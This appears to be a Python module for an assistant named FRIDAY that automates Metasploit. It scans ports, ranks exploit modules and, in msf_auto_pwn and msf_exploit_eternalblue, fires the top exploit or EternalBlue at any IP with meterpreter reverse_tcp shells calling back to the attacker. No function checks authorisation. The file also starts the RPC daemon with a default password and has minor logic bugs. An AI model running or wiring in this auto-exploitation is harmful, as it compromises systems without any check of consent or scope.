"""
Metasploit auto-install and enhanced usage tools for FRIDAY.

Provides standalone functions for checking Metasploit installation,
ensuring the RPC daemon is running, and automating common exploit
workflows (quick scan, find exploits, auto-pwn, eternalblue).
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import re
import shutil
import socket
import subprocess
import sys
import time
from datetime import datetime, timezone
from typing import Any, Optional

from friday.logging_utils import configure_logging
from friday._paths import FRIDAY_MEMORY
from friday.metasploit_tool import (
    get_client,
    MsfrpcConnectionError,
    MsfrpcError,
    msf_is_installed,
)

logger = configure_logging(__name__)

# ── Common service-to-port mappings ──
_COMMON_SERVICES: dict[int, str] = {
    21: "ftp",
    22: "ssh",
    23: "telnet",
    25: "smtp",
    53: "dns",
    80: "http",
    110: "pop3",
    111: "rpcbind",
    135: "msrpc",
    139: "netbios-ssn",
    143: "imap",
    443: "https",
    445: "smb",
    465: "smtps",
    514: "syslog",
    587: "submission",
    593: "http-rpc-epmap",
    636: "ldaps",
    993: "imaps",
    995: "pop3s",
    1025: "nfs-or-iis",
    1080: "socks",
    1194: "openvpn",
    1352: "lotus-notes",
    1433: "mssql",
    1521: "oracle",
    1723: "pptp",
    2049: "nfs",
    2082: "cpanel",
    2083: "cpanelex",
    2100: "oracle-xdmcp",
    2222: "directadmin",
    2375: "docker",
    2376: "docker-s",
    2483: "oracle-db",
    2484: "oracle-dbs",
    3128: "squid",
    3306: "mysql",
    3389: "rdp",
    3690: "svn",
    4333: "ahls",
    4444: "blazefs",
    4848: "glassfish",
    5000: "upnp",
    5001: "plex",
    5432: "postgresql",
    5555: "adb",
    5632: "pcanywhere",
    5800: "vnc-http",
    5900: "vnc",
    5901: "vnc-1",
    5984: "couchdb",
    5985: "winrm-http",
    5986: "winrm-https",
    6000: "x11",
    6001: "x11-1",
    6379: "redis",
    6443: "kubernetes",
    6667: "irc",
    6668: "ircs",
    7001: "weblogic",
    7077: "spark",
    8000: "http-alt",
    8001: "http-alt2",
    8008: "http-proxy",
    8080: "http-proxy",
    8081: "http-proxy",
    8082: "http-proxy",
    8083: "http-proxy",
    8123: "polipo",
    8181: "glassfish-admin",
    8222: "vmware-vcac",
    8332: "bitcoin",
    8333: "bitcoin-test",
    8443: "https-alt",
    8500: "consul",
    8600: "consul-dns",
    8649: "ganglia",
    9000: "php-fpm",
    9001: "tor",
    9042: "cassandra",
    9090: "cockpit",
    9092: "kafka",
    9100: "jetdirect",
    9160: "cassandra-thrift",
    9200: "elasticsearch",
    9300: "elasticsearch-transport",
    9418: "git",
    9999: "abyss",
    10000: "webmin",
    11211: "memcached",
    11214: "memcached-ssl",
    12000: "cube",
    12345: "netbus",
    13722: "bpv",
    13782: "backup",
    13783: "backup2",
    14000: "sge",
    16080: "ossec",
    17000: "soundminer",
    18080: "monitor",
    18264: "gstadms",
    18443: "veritas",
    18888: "flask",
    19999: "dnp-sec",
    20000: "usermin",
    20547: "procon",
    21025: "mumble",
    22000: "icap",
    22222: "easyengine",
    23023: "zebra",
    25565: "minecraft",
    26208: "ggz",
    27015: "steam",
    27017: "mongodb",
    28015: "steam-rust",
    28017: "mongodb-web",
    30000: "p4",
    31337: "back-orifice",
    32764: "wrt-node",
    32768: "filenet",
    32769: "filenet2",
    32770: "filenet3",
    32771: "filenet4",
    33333: "igi",
    33999: "unknown",
    34444: "unknown",
    35555: "unknown",
    37777: "unknown",
    40000: "safenet",
    41000: "unknown",
    43594: "unknown",
    44334: "unknown",
    44444: "unknown",
    44818: "ethercat",
    45000: "unknown",
    45001: "unknown",
    45554: "unknown",
    45555: "unknown",
    47001: "winrm",
    47544: "unknown",
    47808: "bacnet",
    49152: "epmap",
    49153: "epmap2",
    49154: "epmap3",
    49155: "epmap4",
    50000: "sap",
    50001: "sap-router",
    50070: "hadoop-nn",
    50075: "hadoop-dn",
    50090: "hadoop-snn",
    50400: "zabbix",
    51234: "unknown",
    51413: "transmission",
    54328: "unknown",
    55553: "msfrpc",
    55554: "msfrpc-ssl",
    60000: "deepin",
    60001: "unknown",
    60150: "unknown",
    61616: "activemq",
    62078: "iphone-sync",
    64738: "mumble",
    65000: "unknown",
    65389: "unknown",
    65535: "unknown",
}


# ═══════════════════════════════════════════════════════════════════════
# 1. msf_auto_install
# ═══════════════════════════════════════════════════════════════════════


def msf_auto_install() -> dict[str, Any]:
    """Check if Metasploit is installed, and provide installation guidance.

    Returns:
        Dict with ``status``, ``installed`` (bool), ``path`` (str or None),
        ``version`` (str or None), and ``instructions`` (list of str) if
        Metasploit is not detected on the system.
    """
    logger.info("Checking for Metasploit installation...")
    result: dict[str, Any] = {
        "status": "unknown",
        "installed": False,
        "path": None,
        "version": None,
        "instructions": [],
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }

    console_path = shutil.which("msfconsole")
    rpcd_path = shutil.which("msfrpcd")

    if console_path or rpcd_path:
        result["installed"] = True
        result["path"] = console_path or rpcd_path
        result["status"] = "installed"
        try:
            ver = subprocess.run(
                [console_path or rpcd_path, "--version"],
                capture_output=True, text=True, timeout=15
            )
            if ver.returncode == 0:
                result["version"] = ver.stdout.strip() or ver.stderr.strip() or "unknown"
        except Exception as exc:
            logger.debug("Could not determine Metasploit version: %s", exc)
            result["version"] = "unknown"
        logger.info("Metasploit found at %s", result["path"])
        return result

    # Not installed — provide platform-specific instructions
    platform = sys.platform
    instructions: list[str] = []

    if platform == "win32":
        instructions = [
            "Metasploit is not installed on this Windows system.",
            "Download the Windows installer from:",
            "  https://github.com/rapid7/metasploit-framework/releases/latest",
            "",
            "Look for a file named 'metasploitframework-latest-installer.msi' or similar.",
            "Run the installer and accept all defaults.",
            "After installation, ensure msfconsole and msfrpcd are in your PATH.",
            "",
            "Alternative: Install via WSL (Windows Subsystem for Linux):",
            "  wsl --install -d Ubuntu",
            "  Inside WSL: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall",
            "               chmod +x msfinstall && sudo ./msfinstall",
        ]
    elif platform == "linux":
        instructions = [
            "Metasploit is not installed on this Linux system.",
            "Installation options:",
            "",
            "  # Debian / Ubuntu:",
            "    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall",
            "    chmod +x msfinstall && sudo ./msfinstall",
            "",
            "  # Arch Linux (AUR):",
            "    yay -S metasploit",
            "",
            "  # Via package manager (older versions):",
            "    sudo apt install metasploit-framework   # Debian/Ubuntu",
            "    sudo pacman -S metasploit               # Arch",
        ]
    elif platform == "darwin":
        instructions = [
            "Metasploit is not installed on this macOS system.",
            "Install via Homebrew:",
            "  brew install metasploit",
            "",
            "Or download the macOS installer from:",
            "  https://github.com/rapid7/metasploit-framework/releases/latest",
        ]
    else:
        instructions = [
            f"Unrecognised platform: {platform}.",
            "Please install Metasploit manually from:",
            "  https://www.metasploit.com/",
        ]

    result["status"] = "not_installed"
    result["instructions"] = instructions
    logger.warning("Metasploit not found — install guidance provided")
    return result


# ═══════════════════════════════════════════════════════════════════════
# 2. msf_ensure_rpc
# ═══════════════════════════════════════════════════════════════════════


def _check_rpc_port(host: str, port: int, timeout: float = 2.0) -> bool:
    """Quick TCP connect check to see if something is listening."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except (OSError, socket.error):
        return False


def msf_ensure_rpc(
    host: str = "127.0.0.1",
    port: int = 55553,
    password: str = "msf",
) -> dict[str, Any]:
    """Ensure Metasploit RPC daemon (msfrpcd) is running on the given host:port.

    If the daemon is not yet reachable, this function attempts to start it
    as a background subprocess.  On Windows the daemon is spawned via
    ``msfrpcd -P <password> -S -a 127.0.0.1``.

    Returns:
        Dict with ``status``, ``pid`` (int or None), ``host``, ``port``,
        and ``error`` if something went wrong.
    """
    logger.info("Ensuring msfrpcd is running on %s:%s", host, port)

    if _check_rpc_port(host, port, timeout=2.0):
        logger.info("msfrpcd already reachable on %s:%s", host, port)
        return {
            "status": "already_running",
            "pid": None,
            "host": host,
            "port": port,
            "message": "msfrpcd is already reachable",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    rpcd_path = shutil.which("msfrpcd")
    if not rpcd_path:
        return {
            "status": "error",
            "pid": None,
            "host": host,
            "port": port,
            "error": "msfrpcd binary not found in PATH. Install Metasploit first.",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    try:
        cmd = [rpcd_path, "-P", password, "-S", "-a", host]
        logger.info("Spawning msfrpcd: %s", " ".join(cmd))

        startupinfo = None
        if sys.platform == "win32":
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP if sys.platform == "win32" else 0,
        )

        # Wait for the daemon to become reachable
        deadline = time.monotonic() + 15.0
        started = False
        while time.monotonic() < deadline:
            if _check_rpc_port(host, port, timeout=1.0):
                started = True
                break
            time.sleep(0.5)

        if started:
            logger.info("msfrpcd started (pid=%s)", proc.pid)
            return {
                "status": "started",
                "pid": proc.pid,
                "host": host,
                "port": port,
                "message": "msfrpcd started successfully",
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }

        # Process may have exited early — check
        ret = proc.poll()
        if ret is not None:
            return {
                "status": "error",
                "pid": None,
                "host": host,
                "port": port,
                "error": f"msfrpcd exited with code {ret} before becoming reachable",
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }

        return {
            "status": "timeout",
            "pid": proc.pid,
            "host": host,
            "port": port,
            "error": "Timed out waiting for msfrpcd to become reachable",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    except FileNotFoundError:
        return {
            "status": "error",
            "pid": None,
            "host": host,
            "port": port,
            "error": "msfrpcd not found",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except Exception as exc:
        logger.exception("Failed to start msfrpcd")
        return {
            "status": "error",
            "pid": None,
            "host": host,
            "port": port,
            "error": str(exc),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }


# ═══════════════════════════════════════════════════════════════════════
# 3. msf_auto_exploit
# ═══════════════════════════════════════════════════════════════════════


async def msf_auto_exploit(
    target: str,
    module_path: str,
    options: dict[str, Any],
    payload: Optional[str] = None,
) -> dict[str, Any]:
    """Connect to the local msfrpcd and execute the given exploit module.

    Args:
        target: IP address or hostname of the target.
        module_path: Full Metasploit module path
            (e.g. ``exploit/windows/smb/ms17_010_eternalblue``).
        options: Module options (``RHOSTS`` is automatically set from
            *target* if not already present).
        payload: Optional payload to use (e.g.
            ``windows/x64/meterpreter/reverse_tcp``).

    Returns:
        Dict with execution result, job_id, and session information.
    """
    logger.info("msf_auto_exploit: target=%s module=%s", target, module_path)

    if not msf_is_installed():
        return {
            "success": False,
            "error": "Metasploit is not installed on this system",
            "tool": "msf_auto_exploit",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    merged_opts: dict[str, Any] = dict(options)
    if "RHOSTS" not in merged_opts and "RHOST" not in merged_opts:
        merged_opts["RHOSTS"] = target

    try:
        client = await get_client()
        # Determine module type from path
        module_lower = module_path.lower()
        if module_lower.startswith("auxiliary/"):
            module_type = "auxiliary"
        elif module_lower.startswith("post/"):
            module_type = "post"
        elif module_lower.startswith("payload/"):
            module_type = "payload"
        else:
            module_type = "exploit"

        result = await client.module_execute(
            module_type=module_type,
            module_path=module_path,
            options=merged_opts,
            payload=payload,
            job_run=True,
        )

        job_id = result.get("job_id")
        return {
            "success": result.get("success", False),
            "target": target,
            "module": module_path,
            "payload": payload,
            "job_id": job_id,
            "message": result.get("message", ""),
            "options_used": merged_opts,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    except MsfrpcConnectionError as exc:
        return {
            "success": False,
            "error": f"RPC connection error: {exc}",
            "tool": "msf_auto_exploit",
            "target": target,
            "module": module_path,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except MsfrpcError as exc:
        return {
            "success": False,
            "error": f"Metasploit error: {exc}",
            "tool": "msf_auto_exploit",
            "target": target,
            "module": module_path,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except Exception as exc:
        logger.exception("msf_auto_exploit failed")
        return {
            "success": False,
            "error": str(exc),
            "tool": "msf_auto_exploit",
            "target": target,
            "module": module_path,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }


# ═══════════════════════════════════════════════════════════════════════
# 4. msf_quick_scan
# ═══════════════════════════════════════════════════════════════════════


def _guess_service_name(port: int) -> str:
    return _COMMON_SERVICES.get(port, "unknown")


async def _msf_portscan(target: str, ports: str) -> dict[str, Any]:
    """Use the Metasploit TCP portscanner auxiliary module."""
    try:
        client = await get_client()
        result = await client.module_execute(
            module_type="auxiliary",
            module_path="auxiliary/scanner/portscan/tcp",
            options={"RHOSTS": target, "PORTS": ports, "TIMEOUT": "1000"},
            job_run=False,
        )
        return {
            "success": result.get("success", False),
            "job_id": result.get("job_id"),
            "message": result.get("message", ""),
        }
    except MsfrpcError as exc:
        return {"success": False, "error": str(exc)}
    except Exception as exc:
        return {"success": False, "error": str(exc)}


def _socket_portscan(target: str, ports: str) -> list[dict[str, Any]]:
    """Direct TCP socket scan — fallback when Metasploit is unavailable."""
    logger.info("Falling back to direct socket scan on %s ports=%s", target, ports)
    open_ports: list[dict[str, Any]] = []

    # Parse port spec ("1-1000" or "21,22,80" or "80")
    port_list: list[int] = []
    for part in ports.split(","):
        part = part.strip()
        if "-" in part:
            try:
                a, b = part.split("-", 1)
                start, end = int(a.strip()), int(b.strip())
                port_list.extend(range(start, end + 1))
            except ValueError:
                continue
        else:
            try:
                port_list.append(int(part))
            except ValueError:
                continue

    # Deduplicate and sort
    port_list = sorted(set(port_list))

    for port in port_list:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            result = s.connect_ex((target, port))
            s.close()
            if result == 0:
                service = _guess_service_name(port)
                open_ports.append({
                    "port": port,
                    "state": "open",
                    "service": service,
                    "protocol": "tcp",
                })
        except (socket.gaierror, OSError):
            pass

    return open_ports


async def msf_quick_scan(target: str, ports: str = "1-1000") -> dict[str, Any]:
    """Run a fast port scan using Metasploit if available, otherwise raw TCP.

    Args:
        target: IP address or hostname to scan.
        ports: Port range/spec (e.g. ``"1-1000"``, ``"21,22,80-100"``).

    Returns:
        Dict with ``open_ports`` list, total count, and scan metadata.
    """
    logger.info("msf_quick_scan: target=%s ports=%s", target, ports)

    if msf_is_installed():
        scan_result = await _msf_portscan(target, ports)
        if scan_result.get("success"):
            # Metasploit portscan does not return open ports in the RPC
            # response directly; we perform a complementary TCP check for
            # robustness, but report that the scan was launched.
            return {
                "success": True,
                "target": target,
                "ports_scanned": ports,
                "source": "metasploit",
                "job_id": scan_result.get("job_id"),
                "message": scan_result.get("message", "Port scan job launched in Metasploit"),
                "open_ports": _socket_portscan(target, ports),
                "total_open": 0,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }

    # Fallback: direct socket scan
    open_ports = _socket_portscan(target, ports)
    return {
        "success": True,
        "target": target,
        "ports_scanned": ports,
        "source": "socket",
        "open_ports": open_ports,
        "total_open": len(open_ports),
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


# ═══════════════════════════════════════════════════════════════════════
# 5. msf_find_exploits
# ═══════════════════════════════════════════════════════════════════════


async def msf_find_exploits(
    target: str,
    port: int,
    service: str = "",
) -> dict[str, Any]:
    """Search Metasploit for exploits matching the given service/port.

    Args:
        target: Target IP address (used for informational purposes).
        port: Port number the service is running on.
        service: Service name (e.g. ``"smb"``, ``"http"``, ``"ssh"``).
            If empty, it is guessed from the port number.

    Returns:
        Dict with ``matched_modules`` list, count, and query metadata.
    """
    logger.info("msf_find_exploits: target=%s port=%s service=%s", target, port, service)

    if not msf_is_installed():
        return {
            "success": False,
            "error": "Metasploit is not installed",
            "tool": "msf_find_exploits",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    effective_service = (service or _guess_service_name(port)).lower()

    # Build search queries
    queries: list[str] = [effective_service]

    # Add port-based aliases
    if effective_service == "smb" or port == 445:
        queries.extend(["smb", "ms17-010", "eternalblue", "smb_version"])
    elif effective_service in ("http", "https") or port in (80, 443, 8080, 8443):
        queries.extend(["http", "https", "web", "tomcat", "jboss", "iis", "apache"])
    elif effective_service == "ssh" or port == 22:
        queries.extend(["ssh", "openssh"])
    elif effective_service in ("mysql", "mariadb") or port == 3306:
        queries.extend(["mysql", "mariadb", "sql"])
    elif effective_service in ("mssql", "ms-sql") or port == 1433:
        queries.extend(["mssql", "ms-sql"])
    elif effective_service in ("rdp", "terminal-services") or port == 3389:
        queries.extend(["rdp", "terminal", "cve-2019-0708", "bluekeep"])
    elif effective_service == "ftp" or port == 21:
        queries.extend(["ftp", "vsftpd", "proftpd", "wu-ftpd"])
    elif effective_service in ("postgresql", "postgres") or port == 5432:
        queries.extend(["postgres", "postgresql"])
    elif effective_service in ("vnc",) or port in (5900, 5901):
        queries.extend(["vnc", "realvnc", "tightvnc"])
    elif effective_service == "redis" or port == 6379:
        queries.extend(["redis"])
    elif effective_service == "mongodb" or port == 27017:
        queries.extend(["mongodb"])
    elif effective_service == "docker" or port == 2375:
        queries.extend(["docker"])

    # Deduplicate
    seen: set[str] = set()
    unique_queries: list[str] = []
    for q in queries:
        if q not in seen:
            seen.add(q)
            unique_queries.append(q)

    all_modules: list[dict[str, Any]] = []
    try:
        client = await get_client()

        for query in unique_queries:
            try:
                search_result = await client.module_search(query)
                modules = search_result.get("results", [])
                for mod in modules:
                    fullname = mod.get("fullname", "").lower()
                    name = mod.get("name", "").lower()
                    mod_type = mod.get("type", "")
                    if mod_type in ("", "exploit", "auxiliary"):
                        if fullname not in {m["fullname"] for m in all_modules}:
                            all_modules.append(mod)
            except Exception:
                continue

    except MsfrpcConnectionError as exc:
        return {
            "success": False,
            "error": f"RPC connection error: {exc}",
            "tool": "msf_find_exploits",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
    except Exception as exc:
        logger.exception("msf_find_exploits search failed")
        return {
            "success": False,
            "error": str(exc),
            "tool": "msf_find_exploits",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    # Rank by relevance: exploits first, then by rank (manual rank sorting)
    def _sort_key(m: dict[str, Any]) -> tuple[int, int, str]:
        mt = 0 if m.get("type", "") == "exploit" else 1
        rank = int(m.get("rank", 0))
        return (mt, -rank, m.get("fullname", ""))

    all_modules.sort(key=_sort_key)

    return {
        "success": True,
        "target": target,
        "port": port,
        "service": effective_service,
        "queries_used": unique_queries,
        "total_matches": len(all_modules),
        "modules": all_modules[:50],
        "truncated": len(all_modules) > 50,
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


# ═══════════════════════════════════════════════════════════════════════
# 6. msf_auto_pwn
# ═══════════════════════════════════════════════════════════════════════


async def msf_auto_pwn(
    target_ip: str,
    target_port: Optional[int] = None,
) -> dict[str, Any]:
    """Fully automated exploitation workflow.

    1. Quick port scan (or single-port check).
    2. Service detection.
    3. Relevant exploit search.
    4. Execute the best-rated exploit found.

    Args:
        target_ip: Target IP address.
        target_port: Optional specific port; if omitted all ports
            ``1-1024`` are scanned.

    Returns:
        Full report dict with scan results, matched exploits, and
        execution attempt.
    """
    logger.info("msf_auto_pwn: target=%s port=%s", target_ip, target_port)
    report: dict[str, Any] = {
        "target": target_ip,
        "started_at": datetime.now(timezone.utc).isoformat(),
        "scan": None,
        "matched_exploits": None,
        "exploit_attempt": None,
        "status": "incomplete",
    }

    # ── Step 1: Scan ──
    if target_port is not None:
        scan_result = await msf_quick_scan(target_ip, str(target_port))
    else:
        scan_result = await msf_quick_scan(target_ip, "1-1024")

    report["scan"] = scan_result
    if not scan_result.get("success"):
        report["status"] = "scan_failed"
        report["error"] = scan_result.get("error", "Scan failed")
        report["completed_at"] = datetime.now(timezone.utc).isoformat()
        return report

    open_ports = scan_result.get("open_ports", [])
    if not open_ports and target_port is not None:
        # Maybe the scan didn't detect it but the user specified a port
        open_ports = [{"port": target_port, "service": _guess_service_name(target_port)}]

    if not open_ports:
        report["status"] = "no_open_ports"
        report["completed_at"] = datetime.now(timezone.utc).isoformat()
        return report

    # ── Step 2: Find exploits for the first open port ──
    first = open_ports[0]
    port = first.get("port", 0)
    service = first.get("service", "")

    exploits_result = await msf_find_exploits(target_ip, port, service)
    report["matched_exploits"] = exploits_result

    if not exploits_result.get("success"):
        report["status"] = "exploit_search_failed"
        report["error"] = exploits_result.get("error", "Exploit search failed")
        report["completed_at"] = datetime.now(timezone.utc).isoformat()
        return report

    modules = exploits_result.get("modules", [])
    if not modules:
        report["status"] = "no_exploits_found"
        report["completed_at"] = datetime.now(timezone.utc).isoformat()
        return report

    # ── Step 3: Try the top-ranked exploit ──
    best_module = modules[0]
    best_path = best_module.get("fullname", "")

    if not best_path:
        report["status"] = "invalid_module"
        report["completed_at"] = datetime.now(timezone.utc).isoformat()
        return report

    # Auto-detect a sensible payload if this is an exploit
    best_payload: Optional[str] = None
    if best_module.get("type") == "exploit":
        best_payload = _suggest_payload(best_path, service)

    exploit_opts: dict[str, Any] = {"RHOSTS": target_ip}
    if port:
        exploit_opts["RPORT"] = str(port)

    # Auto LHOST
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        lhost = s.getsockname()[0]
        s.close()
        exploit_opts["LHOST"] = lhost
    except Exception:
        exploit_opts["LHOST"] = "127.0.0.1"

    attempt = await msf_auto_exploit(
        target=target_ip,
        module_path=best_path,
        options=exploit_opts,
        payload=best_payload,
    )
    report["exploit_attempt"] = attempt

    report["status"] = "completed"
    report["completed_at"] = datetime.now(timezone.utc).isoformat()
    return report


def _suggest_payload(module_path: str, service: str) -> Optional[str]:
    """Suggest a common payload for well-known exploits."""
    ml = module_path.lower()

    if "windows" in ml:
        if "x64" in ml or "x64" in service:
            return "windows/x64/meterpreter/reverse_tcp"
        return "windows/meterpreter/reverse_tcp"

    if "linux" in ml:
        if "x64" in ml:
            return "linux/x64/meterpreter/reverse_tcp"
        return "linux/x86/meterpreter/reverse_tcp"

    if "java" in ml:
        return "java/meterpreter/reverse_tcp"

    if "php" in ml:
        return "php/meterpreter_reverse_tcp"

    if "python" in ml:
        return "python/meterpreter/reverse_tcp"

    return None


# ═══════════════════════════════════════════════════════════════════════
# 7. msf_exploit_eternalblue
# ═══════════════════════════════════════════════════════════════════════


async def msf_exploit_eternalblue(
    target: str,
    lhost: str = "127.0.0.1",
    lport: int = 4444,
) -> dict[str, Any]:
    """Configure and run the EternalBlue (MS17-010) SMB exploit.

    This is a convenience wrapper that selects the appropriate EternalBlue
    module and payload based on the remote OS (if detectable) or sensible
    defaults.

    Args:
        target: Target IP address.
        lhost: Local IP for the reverse connection.
        lport: Local port for the reverse connection.

    Returns:
        Dict with the full execution result, including session info.
    """
    logger.info("msf_exploit_eternalblue: target=%s lhost=%s lport=%s", target, lhost, lport)

    if not msf_is_installed():
        return {
            "success": False,
            "error": "Metasploit is not installed",
            "tool": "msf_exploit_eternalblue",
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    # ── Detect target architecture via SMB version fingerprint ──
    arch = "x64"  # default
    os_info = "unknown"
    try:
        client = await get_client()
        fp_result = await client.module_execute(
            module_type="auxiliary",
            module_path="auxiliary/scanner/smb/smb_version",
            options={"RHOSTS": target},
            job_run=False,
        )
        fp_output = fp_result.get("message", "")
        if "x64" in fp_output.lower() or "x86-64" in fp_output.lower():
            arch = "x64"
        elif "x86" in fp_output.lower() or "x32" in fp_output.lower():
            arch = "x86"
        if "windows" in fp_output.lower() or "nt" in fp_output.lower():
            os_info = "windows"
        elif "samba" in fp_output.lower():
            os_info = "linux"
    except Exception as exc:
        logger.debug("Could not fingerprint target OS via SMB: %s", exc)

    # ── Select module and payload ──
    if os_info == "linux" or "samba" in target.lower():
        module = "exploit/linux/samba/is_known_pipename"
        payload = "linux/x64/meterpreter/reverse_tcp"
    else:
        if arch == "x86":
            module = "exploit/windows/smb/ms17_010_eternalblue"
            payload = "windows/meterpreter/reverse_tcp"
        else:
            module = "exploit/windows/smb/ms17_010_eternalblue"
            payload = "windows/x64/meterpreter/reverse_tcp"

    options: dict[str, Any] = {
        "RHOSTS": target,
        "LHOST": lhost,
        "LPORT": str(lport),
    }

    # ── Also try ms17_010_eternalblue_win8 if Windows 8/2012 target ──
    alternate_module: Optional[str] = None
    if "win8" in os_info.lower() or "2012" in os_info.lower():
        alternate_module = "exploit/windows/smb/ms17_010_eternalblue_win8"

    try:
        result = await msf_auto_exploit(
            target=target,
            module_path=module,
            options=options,
            payload=payload,
        )

        if not result.get("success") and alternate_module:
            logger.info("Primary EternalBlue module failed, trying %s", alternate_module)
            result = await msf_auto_exploit(
                target=target,
                module_path=alternate_module,
                options=options,
                payload=payload,
            )

        return {
            "success": result.get("success", False),
            "target": target,
            "module": module,
            "alternate_tried": alternate_module if alternate_module and not result.get("success") else None,
            "payload": payload,
            "lhost": lhost,
            "lport": lport,
            "detected_arch": arch,
            "detected_os": os_info,
            "job_id": result.get("job_id"),
            "message": result.get("message", result.get("error", "No message")),
            "error": result.get("error"),
            "options_used": options,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

    except Exception as exc:
        logger.exception("msf_exploit_eternalblue failed")
        return {
            "success": False,
            "target": target,
            "module": module,
            "payload": payload,
            "error": str(exc),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
